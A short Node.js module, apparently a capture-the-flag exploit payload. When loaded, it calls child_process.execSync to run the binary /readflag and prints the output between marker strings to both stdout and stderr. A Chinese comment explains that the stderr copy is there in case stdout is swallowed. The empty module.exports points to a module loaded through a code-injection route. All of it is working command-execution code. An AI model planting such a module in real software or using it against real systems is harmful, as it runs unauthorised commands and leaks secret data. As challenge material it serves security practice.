const { execSync } = require('child_process');
try {
    const flag = execSync('/readflag').toString().trim();
    console.log("!!!FLAG_START!!! " + flag + " !!!FLAG_END!!!");
    // 同时也写到 stderr 以防 stdout 被吞
    console.error("!!!FLAG_START!!! " + flag + " !!!FLAG_END!!!");
} catch (e) {
    console.error(e);
}
module.exports = {};